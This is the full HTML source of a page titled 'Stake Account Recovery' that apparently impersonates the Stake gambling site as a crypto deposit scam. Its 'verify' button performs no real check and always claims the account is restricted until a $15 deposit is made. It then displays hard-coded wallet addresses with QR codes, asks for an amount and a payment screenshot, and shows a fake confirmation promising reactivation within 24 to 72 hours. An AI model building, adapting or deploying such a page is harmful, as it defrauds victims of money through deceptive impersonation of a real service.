<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Stake Account Recovery</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qr.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }

    body {
      background: radial-gradient(circle at top left, #1a2a3b, #0f212e);
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow-y: auto;
      transition: background 0.3s, color 0.3s;
    }

    body.light-theme {
      background: #f0f0f0;
      color: #000;
    }

    .container {
      background: rgba(47, 69, 83, 0.9);
      backdrop-filter: blur(8px);
      padding: 25px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(2, 220, 5, 0.15);
      width: 90%;
      max-width: 480px;
      position: relative;
      z-index: 1;
    }

    .container.light-theme {
      background: rgba(255, 255, 255, 0.9);
    }

    .header {
      text-align: center;
      margin-bottom: 25px;
    }

    .header img {
      width: 120px;
      margin-bottom: 10px;
    }

    .header h2 {
      color: #02dc05;
      font-size: 1.8rem;
      font-weight: 600;
    }

    .form-group {
      margin-bottom: 15px;
    }

    label {
      font-weight: 500;
      margin-bottom: 6px;
      display: block;
    }

    input, select {
      width: 100%;
      padding: 10px;
      background: #11232f;
      border: 2px solid transparent;
      border-radius: 8px;
      color: #fff;
      font-size: 0.95rem;
      transition: border 0.3s;
    }

    input:focus, select:focus {
      border: 2px solid #02dc05;
      outline: none;
    }

    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background: #02dc05;
      color: #0f212e;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    button:hover {
      box-shadow: 0 0 10px #02dc05, 0 0 20px #02dc05;
    }

    #themeToggle {
      position: absolute;
      top: 20px;
      right: 20px;
      background: #ffffff20;
      padding: 6px 12px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 0.9rem;
    }

    .copy-btn {
      margin-top: 5px;
      background-color: #166ae0;
      color: #fff;
    }

    .message {
      font-size: 0.9rem;
      color: #00ff9d;
      margin-top: 8px;
    }

    #popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: rgba(47, 69, 83, 0.95);
      color: #fff;
      padding: 25px;
      border-radius: 14px;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
      z-index: 9999;
      animation: fadeIn 0.4s ease;
      max-width: 90%;
      text-align: center;
    }

    #popup p {
      font-size: 1rem;
      color: #ffdc00;
      font-weight: 500;
    }

    #qrcode-container {
      margin-top: 10px;
      text-align: center;
    }

    #qrcode {
      margin: 10px auto;
      height: 150px;
      width: 150px;
    }

    #saveQR {
      margin-top: 8px;
      width: auto;
      padding: 8px 16px;
    }

    .toast {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: #333;
      color: #fff;
      padding: 12px 20px;
      border-radius: 6px;
      display: none;
      z-index: 10000;
    }

    .live-chat-icon {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: #02dc05;
      color: #000;
      padding: 12px;
      border-radius: 50%;
      font-weight: bold;
      cursor: pointer;
    }

    .chat-box {
      position: fixed;
      bottom: 80px;
      right: 20px;
      background: #1a2a3b;
      padding: 20px;
      width: 280px;
      border-radius: 12px;
      display: none;
      flex-direction: column;
      gap: 10px;
      color: #fff;
    }

    .blur {
      filter: blur(5px);
      pointer-events: none;
      user-select: none;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95) translate(-50%, -50%); }
      to { opacity: 1; transform: scale(1) translate(-50%, -50%); }
    }
  </style>
</head>
<body>
  <div id="themeToggle" onclick="toggleTheme()">ðŸŒ™</div>

  <div class="container" id="main-content">
    <div class="header">
      <img src="stake-logo-white.png" alt="Stake Logo" />
      <h2>Account Recovery</h2>
    </div>
    <div class="form-group">
      <label for="username">Username</label>
      <input type="text" id="username" placeholder="Enter Stake Username" />
      <button onclick="verifyUsername()">Verify</button>
      <div class="message" id="verify-msg"></div>
    </div>
    <div class="form-group">
      <label for="coin">Select Coin</label>
      <select id="coin" onchange="updateAddress()">
        <option value="">--Select Coin--</option>
        <option value="usdt">USDT</option>
        <option value="btc">BTC</option>
        <option value="trx">TRX</option>
        <option value="eth">Ethereum</option>
      </select>
    </div>
    <div class="form-group">
      <label for="network">Select Network</label>
      <select id="network" onchange="updateAddress()">
        <option value="">--Select Network--</option>
        <option value="trc20">TRC20</option>
        <option value="bsc">BSC</option>
      </select>
    </div>
    <div class="form-group">
      <label for="address">Wallet Address</label>
      <input type="text" id="address" readonly />
      <button class="copy-btn" onclick="copyAddress()">Copy</button>
      <div id="qrcode-container">
        <canvas id="qrcode"></canvas>
        <button id="saveQR" onclick="saveQR()">Save QR</button>
      </div>
    </div>
    <div class="form-group">
      <label for="amount">Enter Amount (USD)</label>
      <input type="number" id="amount" />
    </div>
    <div class="form-group">
      <label for="screenshot">Upload Screenshot</label>
      <input type="file" id="screenshot" />
    </div>
    <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
  </div>

  <div id="popup">
    <p>Your account recovery request has been successfully received. We have forwarded your request to the Stake technical team for prompt action. Your Stake account will be fully reactivated within 24 to 72 hours.</p>
    <button onclick="location.reload()">OK</button>
  </div>

  <div class="toast" id="toast"></div>

  <div class="live-chat-icon" onclick="toggleChat()">ðŸ’¬</div>
  <div class="chat-box" id="chatBox">
    <strong>Support</strong>
    <p>Hello! How can we assist you today?</p>
    <input type="text" placeholder="Type a message..." />
  </div>

  <script>
    const addressMap = {
      usdt: {
        trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA',
        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
      },
      btc: {
        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
      },
      trx: {
        trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA',
        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
      },
      eth: {
        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
      }
    };

    function updateAddress() {
      const coin = document.getElementById('coin').value;
      const network = document.getElementById('network').value;
      const addressField = document.getElementById('address');
      const qr = document.getElementById('qrcode');

      if (coin && network && addressMap[coin] && addressMap[coin][network]) {
        const addr = addressMap[coin][network];
        addressField.value = addr;
        new QRious({ element: qr, value: addr, size: 150 });
      } else {
        addressField.value = '';
        qr.getContext('2d').clearRect(0, 0, qr.width, qr.height);
      }
      checkForm();
    }

    function saveQR() {
      const canvas = document.getElementById('qrcode');
      const link = document.createElement('a');
      link.href = canvas.toDataURL('image/png');
      link.download = 'wallet-qr.png';
      link.click();
      showToast('QR saved');
    }

    function copyAddress() {
      const address = document.getElementById('address');
      address.select();
      document.execCommand('copy');
      showToast('Address copied!');
    }

    function showToast(msg) {
      const toast = document.getElementById('toast');
      toast.textContent = msg;
      toast.style.display = 'block';
      setTimeout(() => toast.style.display = 'none', 3000);
    }

    function toggleTheme() {
      document.body.classList.toggle('light-theme');
      showToast('Theme toggled');
    }

    function toggleChat() {
      const box = document.getElementById('chatBox');
      box.style.display = box.style.display === 'flex' ? 'none' : 'flex';
    }

    function verifyUsername() {
      const msg = document.getElementById('verify-msg');
      msg.innerHTML = 'Verifying...';
      setTimeout(() => {
        msg.innerHTML = 'Your Stake account is currently restricted to withdrawal-only mode. To unlock full access, a minimum deposit of $15 is required.';
      }, 1500);
    }

    function checkForm() {
      const username = document.getElementById('username').value;
      const coin = document.getElementById('coin').value;
      const network = document.getElementById('network').value;
      const address = document.getElementById('address').value;
      const amount = document.getElementById('amount').value;
      const screenshot = document.getElementById('screenshot').files.length;
      document.getElementById('submitBtn').disabled = !(username && coin && network && address && amount && screenshot);
    }

    document.querySelectorAll('input, select').forEach(input => {
      input.addEventListener('change', checkForm);
    });

    function submitForm() {
      document.getElementById('main-content').classList.add('blur');
      document.getElementById('popup').style.display = 'block';
      if (navigator.vibrate) navigator.vibrate(100);
    }
  </script>
</body>
</html>
